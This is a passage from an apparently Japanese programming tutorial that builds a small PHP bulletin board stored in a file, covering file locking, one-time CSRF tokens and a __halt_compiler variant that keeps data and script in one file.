    <span class="p">}</span>
    <span class="nt">label</span> <span class="p">{</span>
      <span class="k">display</span><span class="p">:</span> <span class="kc">block</span><span class="p">;</span>
      <span class="k">margin</span><span class="p">:</span> <span class="mi">10</span><span class="kt">px</span> <span class="mi">10</span><span class="kt">px</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">--</span><span class="o">&gt;</span>
 <span class="o">]]&gt;</span><span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"wrapper"</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"header"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>～ミニ掲示板～<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"container"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"textarea"</span><span class="p">&gt;</span>
          <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">""</span> <span class="na">method</span><span class="o">=</span><span class="s">"post"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>名前: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"name"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>Eメール: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"email"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;</span>本文<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">textarea</span> <span class="na">name</span><span class="o">=</span><span class="s">"text"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">textarea</span><span class="p">&gt;&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">style</span><span class="o">=</span><span class="s">"text-align:right;"</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">name</span><span class="o">=</span><span class="s">"submit"</span> <span class="na">value</span><span class="o">=</span><span class="s">"投稿"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">label</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">"hidden"</span> <span class="na">name</span><span class="o">=</span><span class="s">"token"</span> <span class="na">value</span><span class="o">=</span><span class="s">"</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$token</span><span class="p">)</span><span class="cp">?&gt;</span><span class="s">"</span> <span class="p">/&gt;&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
          <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"messages"</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nx">exception_to_array</span><span class="p">(</span><span class="nv">$e</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$msg</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$articles</span><span class="p">))</span><span class="o">:</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"articles"</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$articles</span> <span class="k">as</span> <span class="nv">$article</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article"</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article_name"</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"mailto:</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'email'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article_text"</span><span class="p">&gt;&lt;</span><span class="nt">pre</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'text'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">"article_time"</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$article</span><span class="p">[</span><span class="s1">'time'</span><span class="p">])</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
          <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"footer"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"?page=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$page</span><span class="o">-</span><span class="mi">1</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span>前<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span> | 
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
          <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"?"</span><span class="p">&gt;</span>最新<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$page_count</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$page</span> <span class="o">&lt;</span> <span class="nv">$page_count</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
           | <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"?page=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$page</span><span class="o">+</span><span class="mi">1</span><span class="cp">?&gt;</span><span class="s">"</span><span class="p">&gt;</span>次<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endif</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">p</span> <span class="na">class</span><span class="o">=</span><span class="s">"page"</span><span class="p">&gt;</span><span class="cp">&lt;?php</span>
          <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$current_count</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">'まだ書き込みはありません'</span><span class="p">;</span>
          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nb">printf</span><span class="p">(</span><span class="s1">'%d件中%d件目～%d件目(%dページ中%dページ目)を表示中'</span><span class="p">,</span>
              <span class="nv">$whole_count</span><span class="p">,</span>
              <span class="p">(</span><span class="nv">$tmp</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="nx">DISP_MAX</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span>
              <span class="nv">$tmp</span> <span class="o">+</span> <span class="nv">$current_count</span><span class="p">,</span>
              <span class="nv">$page_count</span><span class="p">,</span>
              <span class="nv">$page</span>
            <span class="p">);</span>
          <span class="p">}</span>
        <span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
      <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<h2>
<span id="工夫していること" class="fragment"></span><a href="#%E5%B7%A5%E5%A4%AB%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%93%E3%81%A8"><i class="fa fa-link"></i></a>工夫していること</h2>

<ul>
<li>ファイルオープン回数を最小に抑えている。</li>
<li>ファイル読み込み時には <strong>共有ロック</strong> 、書き込み時にはさらに <strong>排他ロック</strong> にすることにより、<br>
<ins>ファイルの破損・スクリプトの誤作動を徹底的に防止</ins>している。</li>
<li>ちまちまファイルで1行ずつテキスト管理を行うよりも、配列ごとシリアライズしてぶち込んだ方が<br>
扱いラクじゃんということで後者を採用。但しデータサイズが膨大になってくるとそもそも<br>
ファイル１つでの管理では追いつかなくなるため、データベースを使う必要性が出てくる。</li>
<li>例外をスタックを用いて処理している。</li>
<li>ワンタイムトークンを用いてCSRF攻撃や連投を簡易的に防いでいる。<br>
厳密にするにはIPアドレスでの判断を行うことになるが、ここでは割愛。</li>
</ul>

<h2>
<span id="関連" class="fragment"></span><a href="#%E9%96%A2%E9%80%A3"><i class="fa fa-link"></i></a>関連</h2>

<h3>
<span id="_get-_postなどを受け取る際の処理" class="fragment"></span><a href="#_get-_post%E3%81%AA%E3%81%A9%E3%82%92%E5%8F%97%E3%81%91%E5%8F%96%E3%82%8B%E9%9A%9B%E3%81%AE%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/2f9955db1c02eeef43ea" id="reference-cdae30cb86b7deeddb2e">$_GET, $_POSTなどを受け取る際の処理</a>
</h3>

<h3>
<span id="php-ファイルオープンモードに関するマニュアルの記述は間違っている" class="fragment"></span><a href="#php-%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%AA%E3%83%BC%E3%83%97%E3%83%B3%E3%83%A2%E3%83%BC%E3%83%89%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E3%83%9E%E3%83%8B%E3%83%A5%E3%82%A2%E3%83%AB%E3%81%AE%E8%A8%98%E8%BF%B0%E3%81%AF%E9%96%93%E9%81%95%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a><a href="http://qiita.com/items/3adcec3c66e515895b08">[PHP] ファイルオープンモードに関するマニュアルの記述は間違っている</a>
</h3>

<h3>
<span id="mysql版-ページング処理を採り入れた掲示板サンプル" class="fragment"></span><a href="#mysql%E7%89%88-%E3%83%9A%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E5%87%A6%E7%90%86%E3%82%92%E6%8E%A1%E3%82%8A%E5%85%A5%E3%82%8C%E3%81%9F%E6%8E%B2%E7%A4%BA%E6%9D%BF%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/4ab192e04430119d5599" id="reference-cf99c45fd5365aef9993">[MySQL版] ページング処理を採り入れた掲示板サンプル</a>
</h3>

<h3>
<span id="まとめて例外をスローする小技" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81%E3%81%A6%E4%BE%8B%E5%A4%96%E3%82%92%E3%82%B9%E3%83%AD%E3%83%BC%E3%81%99%E3%82%8B%E5%B0%8F%E6%8A%80"><i class="fa fa-link"></i></a><a href="http://qiita.com/mpyw/items/6bd99ff62571c02feaa1" id="reference-4c060c7df9b190c6d1e3">まとめて例外をスローする小技</a>
</h3>

<h1>
<span id="おまけ" class="fragment"></span><a href="#%E3%81%8A%E3%81%BE%E3%81%91"><i class="fa fa-link"></i></a>おまけ</h1>

<h2>
<span id="データとスクリプトを1ファイルにまとめる荒業" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%81%A8%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88%E3%82%921%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AB%E3%81%BE%E3%81%A8%E3%82%81%E3%82%8B%E8%8D%92%E6%A5%AD"><i class="fa fa-link"></i></a>データとスクリプトを1ファイルにまとめる荒業</h2>

<p><strong><a href="http://php.net/manual/ja/function.halt-compiler.php" rel="nofollow noopener" target="_blank">__halt_compiler</a></strong> という(一応)関数を使えばこんな気持ち悪いことも出来てしまう。</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="cm">/* 設定 */</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DISP_MAX'</span><span class="p">,</span>  <span class="mi">10</span><span class="p">);</span>                 <span class="c1">// 1ページの最大表示数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'LIMIT_SEC'</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>                  <span class="c1">// 連続投稿を禁止する秒数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'TOKEN_MAX'</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>                 <span class="c1">// ワンタイムトークン蓄積最大数</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'SESSION_NAME'</span><span class="p">,</span> <span class="s1">'MiniBoard'</span><span class="p">);</span>     <span class="c1">// セッションクッキーに用いる名前</span>
<span class="nb">date_default_timezone_set</span><span class="p">(</span><span class="s1">'Asia/Tokyo'</span><span class="p">);</span> <span class="c1">// タイムゾーン</span>
<span class="nb">mb_internal_encoding</span><span class="p">(</span><span class="s1">'UTF-8'</span><span class="p">);</span>           <span class="c1">// 内部エンコーディング</span>

<span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * RuntimeExceptionを生成する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">e</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="nx">Exception</span> <span class="o">&amp;</span><span class="nv">$previous</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="k">new</span> <span class="nx">RuntimeException</span><span class="p">(</span><span class="nv">$msg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$previous</span><span class="p">);</span>
<span class="p">}</span>

<span class="sd">/**</span>
<span class="sd"> * 例外スタックのメッセージ部分を配列に変換する関数</span>
<span class="sd"> * http://qiita.com/mpyw/items/6bd99ff62571c02feaa1</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">exception_to_array</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="nv">$msgs</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$e</span> <span class="o">=</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getPrevious</span><span class="p">());</span>
    <span class="k">return</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$msgs</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* 変数の初期化 */</span>
<span class="c1">// リクエストパラメータをトリミングした後展開</span>
<span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'name'</span><span class="p">,</span> <span class="s1">'email'</span><span class="p">,</span> <span class="s1">'text'</span><span class="p">,</span> <span class="s1">'token'</span><span class="p">,</span> <span class="s1">'page'</span><span class="p">,</span> <span class="s1">'submit'</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$$v</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">?</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nv">$v</span><span class="p">])</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">// ページ番号を1以上の整数になるように補正</span>
<span class="nv">$page</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$page</span><span class="p">);</span>

<span class="cm">/* セッションの初期化 */</span>
<span class="nb">session_name</span><span class="p">(</span><span class="nx">SESSION_NAME</span><span class="p">);</span> <span class="c1">// セッション名を設定</span>
<span class="o">@</span><span class="nb">session_start</span><span class="p">();</span>           <span class="c1">// セッション開始</span>
<span class="c1">// セッション変数を初期化</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_SESSION</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
        <span class="s1">'name'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'text'</span>  <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
        <span class="s1">'token'</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(),</span>
        <span class="s1">'prev'</span>  <span class="o">=&gt;</span> <span class="k">null</span><span class="p">,</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* データに関する処理 */</span>
<span class="k">try</span> <span class="p">{</span>
    <span class="c1">// このファイル自身を読み書き両用でオープン</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">,</span> <span class="s1">'a+b'</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'データファイルのオープンに失敗しました。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// ファイルを共有ロック</span>
    <span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">LOCK_SH</span><span class="p">);</span>
    <span class="c1">// ファイルポインタをデータ部まで移動</span>
    <span class="nb">fseek</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">__COMPILER_HALT_OFFSET__</span><span class="p">);</span>
    <span class="c1">// データを読み取ってシリアルからの復元を試みる</span>
    <span class="nv">$articles</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="o">?:</span> <span class="k">array</span><span class="p">();</span>
    <span class="c1">// 送信ボタンが押された場合</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$submit</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="c1">// セッション変数に書き込む情報をセット</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'email'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$email</span><span class="p">;</span>
            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'text'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$text</span><span class="p">;</span>
            <span class="c1">// ワンタイムトークンが直近指定個に含まれていなければ弾く</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'フォームの有効期限が切れています。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// ワンタイムトークンを消費させる</span>
            <span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'token'</span><span class="p">][</span><span class="nv">$token</span><span class="p">]);</span>
            <span class="c1">// 最後の投稿から指定秒経過していなければ弾く</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">]</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$diff</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">]</span> <span class="o">-</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'prev'</span><span class="p">];</span>
                <span class="k">if</span> <span class="p">((</span><span class="nv">$limit</span> <span class="o">=</span> <span class="nx">LIMIT_SEC</span> <span class="o">-</span> <span class="nv">$diff</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">throw</span> <span class="nx">e</span><span class="p">(</span><span class="s2">"投稿間隔が短すぎます。あと</span><span class="si">{</span><span class="nv">$limit</span><span class="si">}</span><span class="s2">秒ほどお待ちください。"</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="c1">// 名前をチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="k">or</span> <span class="nv">$len</span> <span class="o">&gt;</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'名前は30字以下で入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// Eメールアドレスをチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_EMAIL</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'有効なEメールアドレスを入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// 本文をチェック</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$len</span> <span class="o">=</span> <span class="nb">mb_strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">)</span> <span class="k">or</span> <span class="nv">$len</span> <span class="o">&gt;</span> <span class="mi">140</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="s1">'本文は140字以下で入力してください。'</span><span class="p">,</span> <span class="nv">$e</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="c1">// 例外がここまでに1つでも発生していればスローする</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$e</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="c1">// 排他ロックに切り替える</span>
            <span class="nb">flock</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">LOCK_EX</span><span class="p">);</span>
            <span class="c1">// 配列の先頭にデータを追加</span>
            <span class="nb">array_unshift</span><span class="p">(</span><span class="nv">$articles</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="s1">'name'</span>  <span class="o">=&gt;</span> <span class="nv">$name</span><span class="p">,</span>
                <span class="s1">'email'</span> <span class="o">=&gt;</span> <span class="nv">$email</span><span class="p">,</span>
                <span class="s1">'text'</span>  <span class="o">=&gt;</span> <span class="nv">$text</span><span class="p">,</span>
                <span class="s1">'time'</span>  <span class="o">=&gt;</span> <span class="nb">date</span><span class="p">(</span><span class="s1">'Y-m-d H:i:s'</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">]),</span>
            <span class="p">));</span>
            <span class="c1">// データ部を空にする</span>
            <span class="nb">ftruncate</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nx">__COMPILER_HALT_OFFSET__</span><span class="p">);</span>
            <span class="c1">// 編集した配列をシリアル化して上書き</span>
            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$articles</span><span class="p">));</span>
            <span class="c1">// セッションに時間を記録し、メッセージをセット</span>
